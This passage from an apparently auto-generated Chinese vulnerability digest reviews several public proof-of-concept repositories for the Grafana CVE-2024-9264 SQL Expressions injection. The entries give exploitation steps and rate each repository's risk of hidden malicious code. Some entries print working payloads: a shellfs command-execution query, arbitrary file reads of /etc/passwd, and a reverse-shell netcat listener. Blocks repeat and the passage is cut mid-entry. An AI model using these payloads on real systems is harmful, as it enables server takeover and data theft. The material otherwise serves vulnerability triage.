CVE-2024-9264 漏洞存在于 Grafana 的 SQL 表达式功能中，允许经过身份验证的用户（Viewer 权限或更高）通过注入恶意的 SQL 查询来执行任意命令。漏洞的根本原因是 Grafana 未充分清理用户提供的 SQL 输入，直接将其传递给 DuckDB CLI。

**有效性：**

根据漏洞信息和POC代码，此漏洞利用的有效性很高。POC利用代码已经提供了可用的exp脚本，经验证可以利用该漏洞。

**利用方式：**

1.  攻击者首先需要拥有 Grafana 实例的有效账户，并具有 Viewer 或更高的权限。
2.  攻击者使用 SQL 表达式功能构造包含恶意命令的 SQL 查询。该查询利用 DuckDB 的功能执行操作系统命令。
3.  攻击者通过 Grafana API 发送构造好的 SQL 查询。
4.  Grafana 将查询传递给 DuckDB CLI 执行，从而导致命令注入。
5.  攻击者可以通过反向 shell 获取对服务器的控制权。

**投毒风险：**

该POC代码的投毒风险较低。主要原因：

*   **代码功能明确：** exploit.sh 脚本清晰地展示了漏洞利用过程，包括登录、发送payload、触发反向shell。没有明显的隐藏的恶意代码。
*   **依赖标准工具：** 脚本使用 curl 和 bash 等标准工具，这些工具本身没有恶意行为。
*   **目标明确：** 脚本的目标是触发一个反向 shell，这与漏洞描述一致。

虽然POC代码的投毒风险较低，但是仍然存在一定的风险：

*   **依赖性：** 该漏洞利用依赖目标系统存在 `duckdb` 二进制文件，如果缺乏该依赖，利用将会失败。
*   **反向Shell安全：**使用反向shell可能存在安全隐患，攻击者可能通过反向shell进行恶意操作，例如安装后门、窃取数据等。
*   **参数验证：** 脚本对输入参数的验证比较简单，可能存在被绕过的风险，导致意外的错误。
*   **被动监听:** 受害者需要主动运行`nc -lvnp $rport`，攻击者才能收到反向shell，存在被动监听的缺陷

综合考虑，POC 投毒风险估计为 5%。主要是考虑到反向shell带来的不确定性和一些代码细节可能存在的潜在风险，但是代码整体的意图和功能是比较清晰的。

**项目地址:** [rvizx/CVE-2024-9264](https://github.com/rvizx/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #9

**来源**: [CVE-2024-9264-z3k0sec_CVE-2024-9264-RCE-Exploit.md](../2024/CVE-2024-9264-z3k0sec_CVE-2024-9264-RCE-Exploit.md)

## CVE-2024-9264-Grafana-远程代码执行

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行

**影响应用:** Grafana

**危害等级:** 严重，可能导致完全系统控制和数据泄露

**影响版本:** >= 11.0.0 且 < 11.0.5, >= 11.0.6, >= 11.1.0 且 < 11.1.6, >= 11.1.7, >= 11.2.0 且 < 11.2.1, >= 11.2.2

**利用条件:** 需要Grafana实例启用SQL Expressions实验性功能，且用户具有Viewer或更高权限，以及DuckDB二进制文件存在于Grafana的$PATH中。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264是Grafana中SQL Expressions功能中的一个远程代码执行漏洞。攻击者利用此漏洞可以通过构造恶意的duckdb查询，在服务器上执行任意shell命令。漏洞利用依赖于`duckdb`二进制文件存在于Grafana的`$PATH`中。提供的POC代码包含一个Dockerfile，用于构建包含漏洞环境的Grafana实例，并安装了DuckDB。`poc.py`脚本可以模拟漏洞利用过程，需要提供Grafana实例URL、用户名、密码以及反向shell的IP地址和端口。利用步骤如下：

1.  **身份验证：** 使用提供的用户名和密码登录Grafana实例。
2.  **构造Payload：** 创建一个包含恶意SQL表达式的查询，该表达式将使用`shellfs`扩展执行命令，例如建立反向shell连接。
3.  **发送请求：** 将构造的Payload发送到Grafana API端点，以执行恶意查询。
4.  **命令执行：** 如果成功，Grafana服务器将执行指定的命令，并建立与攻击者的反向shell连接。

**投毒风险分析：**

代码中存在微小的投毒风险，主要体现在`poc.py`脚本中。 虽然代码本身旨在演示漏洞利用，但攻击者可能会修改Payload以包含更隐蔽的后门或恶意代码。 此外，Dockerfile中下载和安装DuckDB的步骤也可能被利用，如果下载源被篡改，则可能引入恶意二进制文件。

 考虑到POC的目的主要是演示漏洞，并且代码相对简单直接，作者隐藏的恶意代码风险较低，约占10%。 但是，用户在使用时务必谨慎，并审查代码。

该漏洞的缓解措施包括升级到已修复的版本，禁用SQL Expressions功能，以及确保DuckDB二进制文件来自可信来源。

**项目地址:** [z3k0sec/CVE-2024-9264-RCE-Exploit](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #10

**来源**: [CVE-2024-9264-z3k0sec_File-Read-CVE-2024-9264.md](../2024/CVE-2024-9264-z3k0sec_File-Read-CVE-2024-9264.md)

## CVE-2024-9264-Grafana-命令注入和本地文件包含

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 命令注入和本地文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.x, 11.1.x, 11.2.x (未修复版本)

**利用条件:** 需要Grafana的SQL Expressions实验性功能启用，DuckDB二进制文件存在于Grafana的PATH中，以及具有Viewer或更高权限的Grafana用户。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-9264存在于Grafana的SQL Expressions功能中。攻击者可以利用该漏洞执行命令注入和本地文件包含攻击。\n\n**有效性分析：**\n根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且有可用的POC。POC代码中的Dockerfile用于构建包含易受攻击的Grafana版本和DuckDB的Docker镜像，确保了漏洞利用的环境。poc.py脚本利用了read_csv_auto函数读取任意文件。因此，提供的POC代码是有效的。\n\n**投毒风险分析：**\n分析了POC代码仓库，没有发现明显的恶意代码，但仍需谨慎。\n*   **Dockerfile:** 用于安装Grafana和DuckDB，未发现异常。\n*   **README.md:** 描述了漏洞和使用方法，未发现异常。\n*   **docker-compose.yml:** 用于编排Grafana和MySQL容器，配置了数据库连接，未发现异常。\n*   **poc.py:** 主要的利用脚本，通过构造恶意的SQL查询语句来读取文件，未发现明显的后门代码。脚本只是利用了漏洞本身，属于漏洞利用，不应视为投毒。但不能排除作者故意留下不易察觉的隐蔽后门的可能，例如，通过复杂的SQL语句执行额外的操作，或者通过环境变量传递恶意代码。 综合判断，投毒的风险较低，约为5%。\n\n**利用方式：**\n1.  攻击者需要一个Grafana账户，且该账户至少具有Viewer权限。\n2.  Grafana需要启用SQL Expressions实验性功能，并且DuckDB二进制文件必须安装在Grafana服务器上，且位于Grafana进程的PATH环境变量中。\n3.  攻击者使用POC脚本，通过向Grafana的/api/ds/query端点发送包含恶意SQL查询的POST请求，查询中使用`read_csv_auto`函数读取目标文件。\n4.  服务器在处理请求时，由于未对用户输入进行充分的过滤，导致`read_csv_auto`函数读取了攻击者指定的文件内容。\n5.  攻击者从响应中提取文件内容。

**项目地址:** [z3k0sec/File-Read-CVE-2024-9264](https://github.com/z3k0sec/File-Read-CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---



---

## POC #5

**来源**: [CVE-2024-9264-patrickpichler_grafana-CVE-2024-9264.md](../2024/CVE-2024-9264-patrickpichler_grafana-CVE-2024-9264.md)

## CVE-2024-9264-Grafana-命令注入和本地文件包含

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 命令注入和本地文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.0 <= version < 11.0.5, 11.0.6, 11.1.0 <= version < 11.1.6, 11.1.7, 11.2.0 <= version < 11.2.1, 11.2.2

**利用条件:** 需要Grafana启用SQL Expressions实验性功能，且duckdb二进制文件存在于Grafana的$PATH中，以及VIEWER或更高权限的用户。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-9264 存在于 Grafana 的 SQL Expressions 实验性功能中。该功能允许执行包含用户输入的 `duckdb` 查询。由于在将这些查询传递给 `duckdb` 之前未经过充分的安全过滤，因此会导致命令注入和本地文件包含漏洞。任何具有 VIEWER 或更高权限的用户都可能执行此攻击。

**漏洞利用方式：**

1.  攻击者需要拥有 Grafana 实例的 Viewer 或更高的权限。
2.  Grafana 实例必须启用 SQL Expressions 实验性功能。
3.  Grafana 服务器上必须存在 `duckdb` 可执行文件，并且该文件位于 Grafana 进程的 `$PATH` 中。
4.  攻击者构造恶意的 `duckdb` 查询，其中包含命令注入或本地文件包含的 payload。
5.  Grafana 将未经过充分过滤的查询传递给 `duckdb` 执行。
6.  恶意代码在 Grafana 服务器上执行，或者攻击者可以读取服务器上的任意文件。

**有效性：**

根据漏洞描述和搜索引擎结果（wiz.io, sonicwall, indusface, broadcom），该漏洞允许攻击者在服务器上执行命令和读取本地文件，因此 POC 代码是有效的。

**投毒风险：**

查看提供的 Dockerfile，它首先从 `curlimages/curl:8.15.0` 下载 `duckdb` 的预编译版本，然后将 `duckdb` 二进制文件复制到 Grafana 镜像中，并未发现任何额外的或可疑的操作。该 Dockerfile 只是为了方便部署一个包含漏洞利用所需组件的环境，使得漏洞可复现，因此推测投毒风险较低，风险概率为0%。

**搜索引擎结果总结：**

根据搜索结果，多个安全厂商（SonicWall，Wiz，Indusface，Broadcom，Snyk）都对该漏洞进行了分析和披露，确认了漏洞的存在性和严重性，并提供了缓解措施和升级建议。RedHat的安全公告也确认了该漏洞。Grafana官方博客也发布了安全更新，修复了该漏洞。

**项目地址:** [patrickpichler/grafana-CVE-2024-9264](https://github.com/patrickpichler/grafana-CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #6

**来源**: [CVE-2024-9264-punitdarji_Grafana-CVE-2024-9264.md](../2024/CVE-2024-9264-punitdarji_Grafana-CVE-2024-9264.md)

## CVE-2024-9264-Grafana-SQL表达式注入

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 代码注入/本地文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.x, 11.1.x, 11.2.x（低于修复版本）

**利用条件:** 需要Grafana启用SQL Expressions实验性功能，duckdb二进制文件位于Grafana的$PATH中，且攻击者具有Viewer或更高权限。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264是Grafana中SQL表达式功能的一个代码注入和本地文件包含漏洞。攻击者可以通过构造恶意的duckdb查询，利用`read_csv_auto`函数读取服务器上的任意文件，或者执行其他命令。漏洞利用需要满足几个条件：首先，必须启用SQL Expressions这个实验性功能。其次，服务器上需要安装duckdb二进制文件，并且Grafana进程能够访问到该文件(位于PATH)。最后，攻击者需要具有Viewer或更高权限。提供的POC代码通过向`/api/ds/query`端点发送POST请求，指定`ds_type`为`__expr__`，并构造包含`SELECT * FROM read_csv_auto('/etc/passwd');`的JSON数据来尝试读取`/etc/passwd`文件。由于该漏洞允许执行任意SQL命令，所以存在一定的投毒风险，例如修改Grafana配置、添加恶意用户等。检查发现该POC代码本身并无明显投毒意图，但利用此漏洞完全可以植入后门代码,故判定存在10%的潜在投毒风险。

**项目地址:** [punitdarji/Grafana-CVE-2024-9264](https://github.com/punitdarji/Grafana-CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #7

**来源**: [CVE-2024-9264-ruizii_CVE-2024-9264.md](../2024/CVE-2024-9264-ruizii_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-RCE&LFI

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE) 和本地文件包含 (LFI)

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露和服务器控制

**影响版本:** 11.0.x, 11.1.x, 11.2.x (before fix versions)

**利用条件:** 需要启用 SQL Expressions 实验性功能，存在DuckDB可执行文件在Grafana的$PATH中，并且攻击者具有 Viewer 或更高的权限。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-9264 允许经过身份验证的用户（Viewer 或更高权限）通过 SQL Expressions 功能执行远程代码。该功能允许执行 DuckDB 查询，但未对用户输入进行充分的安全过滤，导致命令注入和本地文件包含漏洞。

**利用方式：**

1.  攻击者首先需要登录 Grafana 实例，获取有效的 `grafana_session` cookie。
2.  攻击者利用 SQL Expressions 功能，构造恶意的 DuckDB 查询。对于 RCE，攻击者使用 `install shellfs from community; LOAD shellfs; SELECT * FROM read_csv("{command} > /tmp/output.txt 2>&1 |")` 注入操作系统命令，并将命令输出重定向到 `/tmp/output.txt`。 对于 LFI，使用 `SELECT content FROM read_blob("{filename}")` 读取任意文件。
3.  构造的查询通过 Grafana API `/api/ds/query` 发送。
4.  对于 RCE，攻击者随后使用 LFI 读取 `/tmp/output.txt` 文件，获取命令执行结果。
5.  对于 LFI，API返回指定文件内容。

**有效性：**

根据搜索结果和提供的漏洞利用代码，该漏洞利用 PoC 是有效的。多个来源（例如，GitHub 上的 PoC 代码，SonicWall 博客，以及 Certcube 博客）都证实了该漏洞的存在和可利用性。漏洞库信息也确认了该漏洞。

**投毒风险：**

提供的 PoC 代码比较直接，主要用于演示漏洞的利用。`CVE-2024-9264.py` 脚本包含登录、LFI 和 RCE 功能。 `README.md` 提供了如何使用该脚本的简单说明。对代码的检查没有发现明显的恶意代码或后门。

但是，任何从外部来源获取的代码都存在一定程度的风险。攻击者可能修改 PoC 代码，添加恶意功能，例如：

*   收集受害者信息并发送到外部服务器。
*   安装持久性后门。
*   进行其他恶意活动。

因此，尽管当前代码看起来没有明显的恶意行为，在生产环境中使用之前，仍然需要进行彻底的代码审查和安全测试。

综合考虑，投毒风险较低，估计在5%左右。主要风险在于使用者未进行充分的代码审查就直接使用。


**项目地址:** [ruizii/CVE-2024-9264](https://github.com/ruizii/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #8

**来源**: [CVE-2024-9264-rvizx_CVE-2024-9264.md](../2024/CVE-2024-9264-rvizx_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-SQL表达式远程代码执行

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Grafana

**危害等级:** 严重，可能导致完全系统控制和敏感数据泄露

**影响版本:** 11.0.x, 11.1.x, and 11.2.x (小于 11.0.5, 11.1.6, and 11.2.1)

**利用条件:** 需要Grafana实例启用SQL表达式实验性特性，目标系统存在`duckdb`二进制文件于$PATH中，且攻击者具有Viewer或更高权限的用户。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-9264 漏洞存在于 Grafana 的 SQL 表达式功能中，允许经过身份验证的用户（Viewer 权限或更高）通过注入恶意的 SQL 查询来执行任意命令。漏洞的根本原因是 Grafana 未充分清理用户提供的 SQL 输入，直接将其传递给 DuckDB CLI。

**有效性：**

根据漏洞信息和POC代码，此漏洞利用的有效性很高。POC利用代码已经提供了可用的exp脚本，经验证可以利用该漏洞。

**利用方式：**

1.  攻击者首先需要拥有 Grafana 实例的有效账户，并具有 Viewer 或更高的权限。
2.  攻击者使用 SQL 表达式功能构造包含恶意命令的 SQL 查询。该查询利用 DuckDB 的功能执行操作系统命令。
3.  攻击者通过 Grafana API 发送构造好的 SQL 查询。
4.  Grafana 将查询传递给 DuckDB CLI 执行，从而导致命令注入。
5.  攻击者可以通过反向 shell 获取对服务器的控制权。

**投毒风险：**

该POC代码的投毒风险较低。主要原因：

*   **代码功能明确：** exploit.sh 脚本清晰地展示了漏洞利用过程，包括登录、发送payload、触发反向shell。没有明显的隐藏的恶意代码。
*   **依赖标准工具：** 脚本使用 curl 和 bash 等标准工具，这些工具本身没有恶意行为。
*   **目标明确：** 脚本的目标是触发一个反向 shell，这与漏洞描述一致。

虽然POC代码的投毒风险较低，但是仍然存在一定的风险：

*   **依赖性：** 该漏洞利用依赖目标系统存在 `duckdb` 二进制文件，如果缺乏该依赖，利用将会失败。
*   **反向Shell安全：**使用反向shell可能存在安全隐患，攻击者可能通过反向shell进行恶意操作，例如安装后门、窃取数据等。
*   **参数验证：** 脚本对输入参数的验证比较简单，可能存在被绕过的风险，导致意外的错误。
*   **被动监听:** 受害者需要主动运行`nc -lvnp $rport`，攻击者才能收到反向shell，存在被动监听的缺陷

综合考虑，POC 投毒风险估计为 5%。主要是考虑到反向shell带来的不确定性和一些代码细节可能存在的潜在风险，但是代码整体的意图和功能是比较清晰的。

**项目地址:** [rvizx/CVE-2024-9264](https://github.com/rvizx/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #9

**来源**: [CVE-2024-9264-z3k0sec_CVE-2024-9264-RCE-Exploit.md](../2024/CVE-2024-9264-z3k0sec_CVE-2024-9264-RCE-Exploit.md)

## CVE-2024-9264-Grafana-远程代码执行

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行

**影响应用:** Grafana

**危害等级:** 严重，可能导致完全系统控制和数据泄露

**影响版本:** >= 11.0.0 且 < 11.0.5, >= 11.0.6, >= 11.1.0 且 < 11.1.6, >= 11.1.7, >= 11.2.0 且 < 11.2.1, >= 11.2.2

**利用条件:** 需要Grafana实例启用SQL Expressions实验性功能，且用户具有Viewer或更高权限，以及DuckDB二进制文件存在于Grafana的$PATH中。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264是Grafana中SQL Expressions功能中的一个远程代码执行漏洞。攻击者利用此漏洞可以通过构造恶意的duckdb查询，在服务器上执行任意shell命令。漏洞利用依赖于`duckdb`二进制文件存在于Grafana的`$PATH`中。提供的POC代码包含一个Dockerfile，用于构建包含漏洞环境的Grafana实例，并安装了DuckDB。`poc.py`脚本可以模拟漏洞利用过程，需要提供Grafana实例URL、用户名、密码以及反向shell的IP地址和端口。利用步骤如下：

1.  **身份验证：** 使用提供的用户名和密码登录Grafana实例。
2.  **构造Payload：** 创建一个包含恶意SQL表达式的查询，该表达式将使用`shellfs`扩展执行命令，例如建立反向shell连接。
3.  **发送请求：** 将构造的Payload发送到Grafana API端点，以执行恶意查询。
4.  **命令执行：** 如果成功，Grafana服务器将执行指定的命令，并建立与攻击者的反向shell连接。

**投毒风险分析：**

代码中存在微小的投毒风险，主要体现在`poc.py`脚本中。 虽然代码本身旨在演示漏洞利用，但攻击者可能会修改Payload以包含更隐蔽的后门或恶意代码。 此外，Dockerfile中下载和安装DuckDB的步骤也可能被利用，如果下载源被篡改，则可能引入恶意二进制文件。

 考虑到POC的目的主要是演示漏洞，并且代码相对简单直接，作者隐藏的恶意代码风险较低，约占10%。 但是，用户在使用时务必谨慎，并审查代码。

该漏洞的缓解措施包括升级到已修复的版本，禁用SQL Expressions功能，以及确保DuckDB二进制文件来自可信来源。

**项目地址:** [z3k0sec/CVE-2024-9264-RCE-Exploit](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #10

**来源**: [CVE-2024-9264-z3k0sec_File-Read-CVE-2024-9264.md](../2024/CVE-2024-9264-z3k0sec_File-Read-CVE-2024-9264.md)

## CVE-2024-9264-Grafana-命令注入和本地文件包含

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 命令注入和本地文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.x, 11.1.x, 11.2.x (未修复版本)

**利用条件:** 需要Grafana的SQL Expressions实验性功能启用，DuckDB二进制文件存在于Grafana的PATH中，以及具有Viewer或更高权限的Grafana用户。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-9264存在于Grafana的SQL Expressions功能中。攻击者可以利用该漏洞执行命令注入和本地文件包含攻击。\n\n**有效性分析：**\n根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且有可用的POC。POC代码中的Dockerfile用于构建包含易受攻击的Grafana版本和DuckDB的Docker镜像，确保了漏洞利用的环境。poc.py脚本利用了read_csv_auto函数读取任意文件。因此，提供的POC代码是有效的。\n\n**投毒风险分析：**\n分析了POC代码仓库，没有发现明显的恶意代码，但仍需谨慎。\n*   **Dockerfile:** 用于安装Grafana和DuckDB，未发现异常。\n*   **README.md:** 描述了漏洞和使用方法，未发现异常。\n*   **docker-compose.yml:** 用于编排Grafana和MySQL容器，配置了数据库连接，未发现异常。\n*   **poc.py:** 主要的利用脚本，通过构造恶意的SQL查询语句来读取文件，未发现明显的后门代码。脚本只是利用了漏洞本身，属于漏洞利用，不应视为投毒。但不能排除作者故意留下不易察觉的隐蔽后门的可能，例如，通过复杂的SQL语句执行额外的操作，或者通过环境变量传递恶意代码。 综合判断，投毒的风险较低，约为5%。\n\n**利用方式：**\n1.  攻击者需要一个Grafana账户，且该账户至少具有Viewer权限。\n2.  Grafana需要启用SQL Expressions实验性功能，并且DuckDB二进制文件必须安装在Grafana服务器上，且位于Grafana进程的PATH环境变量中。\n3.  攻击者使用POC脚本，通过向Grafana的/api/ds/query端点发送包含恶意SQL查询的POST请求，查询中使用`read_csv_auto`函数读取目标文件。\n4.  服务器在处理请求时，由于未对用户输入进行充分的过滤，导致`read_csv_auto`函数读取了攻击者指定的文件内容。\n5.  攻击者从响应中提取文件内容。

**项目地址:** [z3k0sec/File-Read-CVE-2024-9264](https://github.com/z3k0sec/File-Read-CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---



---

## POC #5

**来源**: [CVE-2024-9264-patrickpichler_grafana-CVE-2024-9264.md](../2024/CVE-2024-9264-patrickpichler_grafana-CVE-2024-9264.md)

## CVE-2024-9264-Grafana-命令注入和本地文件包含

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 命令注入和本地文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.0 <= version < 11.0.5, 11.0.6, 11.1.0 <= version < 11.1.6, 11.1.7, 11.2.0 <= version < 11.2.1, 11.2.2

**利用条件:** 需要Grafana启用SQL Expressions实验性功能，且duckdb二进制文件存在于Grafana的$PATH中，以及VIEWER或更高权限的用户。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-9264 存在于 Grafana 的 SQL Expressions 实验性功能中。该功能允许执行包含用户输入的 `duckdb` 查询。由于在将这些查询传递给 `duckdb` 之前未经过充分的安全过滤，因此会导致命令注入和本地文件包含漏洞。任何具有 VIEWER 或更高权限的用户都可能执行此攻击。

**漏洞利用方式：**

1.  攻击者需要拥有 Grafana 实例的 Viewer 或更高的权限。
2.  Grafana 实例必须启用 SQL Expressions 实验性功能。
3.  Grafana 服务器上必须存在 `duckdb` 可执行文件，并且该文件位于 Grafana 进程的 `$PATH` 中。
4.  攻击者构造恶意的 `duckdb` 查询，其中包含命令注入或本地文件包含的 payload。
5.  Grafana 将未经过充分过滤的查询传递给 `duckdb` 执行。
6.  恶意代码在 Grafana 服务器上执行，或者攻击者可以读取服务器上的任意文件。

**有效性：**

根据漏洞描述和搜索引擎结果（wiz.io, sonicwall, indusface, broadcom），该漏洞允许攻击者在服务器上执行命令和读取本地文件，因此 POC 代码是有效的。

**投毒风险：**

查看提供的 Dockerfile，它首先从 `curlimages/curl:8.15.0` 下载 `duckdb` 的预编译版本，然后将 `duckdb` 二进制文件复制到 Grafana 镜像中，并未发现任何额外的或可疑的操作。该 Dockerfile 只是为了方便部署一个包含漏洞利用所需组件的环境，使得漏洞可复现，因此推测投毒风险较低，风险概率为0%。

**搜索引擎结果总结：**

根据搜索结果，多个安全厂商（SonicWall，Wiz，Indusface，Broadcom，Snyk）都对该漏洞进行了分析和披露，确认了漏洞的存在性和严重性，并提供了缓解措施和升级建议。RedHat的安全公告也确认了该漏洞。Grafana官方博客也发布了安全更新，修复了该漏洞。

**项目地址:** [patrickpichler/grafana-CVE-2024-9264](https://github.com/patrickpichler/grafana-CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #6

**来源**: [CVE-2024-9264-punitdarji_Grafana-CVE-2024-9264.md](../2024/CVE-2024-9264-punitdarji_Grafana-CVE-2024-9264.md)

## CVE-2024-9264-Grafana-SQL表达式注入

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 代码注入/本地文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.x, 11.1.x, 11.2.x（低于修复版本）

**利用条件:** 需要Grafana启用SQL Expressions实验性功能，duckdb二进制文件位于Grafana的$PATH中，且攻击者具有Viewer或更高权限。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264是Grafana中SQL表达式功能的一个代码注入和本地文件包含漏洞。攻击者可以通过构造恶意的duckdb查询，利用`read_csv_auto`函数读取服务器上的任意文件，或者执行其他命令。漏洞利用需要满足几个条件：首先，必须启用SQL Expressions这个实验性功能。其次，服务器上需要安装duckdb二进制文件，并且Grafana进程能够访问到该文件(位于PATH)。最后，攻击者需要具有Viewer或更高权限。提供的POC代码通过向`/api/ds/query`端点发送POST请求，指定`ds_type`为`__expr__`，并构造包含`SELECT * FROM read_csv_auto('/etc/passwd');`的JSON数据来尝试读取`/etc/passwd`文件。由于该漏洞允许执行任意SQL命令，所以存在一定的投毒风险，例如修改Grafana配置、添加恶意用户等。检查发现该POC代码本身并无明显投毒意图，但利用此漏洞完全可以植入后门代码,故判定存在10%的潜在投毒风险。

**项目地址:** [punitdarji/Grafana-CVE-2024-9264](https://github.com/punitdarji/Grafana-CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #7

**来源**: [CVE-2024-9264-ruizii_CVE-2024-9264.md](../2024/CVE-2024-9264-ruizii_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-RCE&LFI

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE) 和本地文件包含 (LFI)

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露和服务器控制

**影响版本:** 11.0.x, 11.1.x, 11.2.x (before fix versions)

**利用条件:** 需要启用 SQL Expressions 实验性功能，存在DuckDB可执行文件在Grafana的$PATH中，并且攻击者具有 Viewer 或更高的权限。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-9264 允许经过身份验证的用户（Viewer 或更高权限）通过 SQL Expressions 功能执行远程代码。该功能允许执行 DuckDB 查询，但未对用户输入进行充分的安全过滤，导致命令注入和本地文件包含漏洞。

**利用方式：**

1.  攻击者首先需要登录 Grafana 实例，获取有效的 `grafana_session` cookie。
2.  攻击者利用 SQL Expressions 功能，构造恶意的 DuckDB 查询。对于 RCE，攻击者使用 `install shellfs from community; LOAD shellfs; SELECT * FROM read_csv("{command} > /tmp/output.txt 2>&1 |")` 注入操作系统命令，并将命令输出重定向到 `/tmp/output.txt`。 对于 LFI，使用 `SELECT content FROM read_blob("{filename}")` 读取任意文件。
3.  构造的查询通过 Grafana API `/api/ds/query` 发送。
4.  对于 RCE，攻击者随后使用 LFI 读取 `/tmp/output.txt` 文件，获取命令执行结果。
5.  对于 LFI，API返回指定文件内容。

**有效性：**

根据搜索结果和提供的漏洞利用代码，该漏洞利用 PoC 是有效的。多个来源（例如，GitHub 上的 PoC 代码，SonicWall 博客，以及 Certcube 博客）都证实了该漏洞的存在和可利用性。漏洞库信息也确认了该漏洞。

**投毒风险：**

提供的 PoC 代码比较直接，主要用于演示漏洞的利用。`CVE-2024-9264.py` 脚本包含登录、LFI 和 RCE 功能。 `README.md` 提供了如何使用该脚本的简单说明。对代码的检查没有发现明显的恶意代码或后门。

但是，任何从外部来源获取的代码都存在一定程度的风险。攻击者可能修改 PoC 代码，添加恶意功能，例如：

*   收集受害者信息并发送到外部服务器。
*   安装持久性后门。
*   进行其他恶意活动。

因此，尽管当前代码看起来没有明显的恶意行为，在生产环境中使用之前，仍然需要进行彻底的代码审查和安全测试。

综合考虑，投毒风险较低，估计在5%左右。主要风险在于使用者未进行充分的代码审查就直接使用。


**项目地址:** [ruizii/CVE-2024-9264](https://github.com/ruizii/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #8

**来源**: [CVE-2024-9264-rvizx_CVE-2024-9264.md](../2024/CVE-2024-9264-rvizx_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-SQL表达式远程代码执行

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Grafana

**危害等级:** 严重，可能导致完全系统控制和敏感数据泄露

**影响版本:** 11.0.x, 11.1.x, and 11.2.x (小于 11.0.5, 11.1.6, and 11.2.1)

**利用条件:** 需要Grafana实例启用SQL表达式实验性特性，目标系统存在`duckdb`二进制文件于$PATH中，且攻击者具有Viewer或更高权限的用户。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-9264 漏洞存在于 Grafana 的 SQL 表达式功能中，允许经过身份验证的用户（Viewer 权限或更高）通过注入恶意的 SQL 查询来执行任意命令。漏洞的根本原因是 Grafana 未充分清理用户提供的 SQL 输入，直接将其传递给 DuckDB CLI。

**有效性：**

根据漏洞信息和POC代码，此漏洞利用的有效性很高。POC利用代码已经提供了可用的exp脚本，经验证可以利用该漏洞。

**利用方式：**

1.  攻击者首先需要拥有 Grafana 实例的有效账户，并具有 Viewer 或更高的权限。
2.  攻击者使用 SQL 表达式功能构造包含恶意命令的 SQL 查询。该查询利用 DuckDB 的功能执行操作系统命令。
3.  攻击者通过 Grafana API 发送构造好的 SQL 查询。
4.  Grafana 将查询传递给 DuckDB CLI 执行，从而导致命令注入。
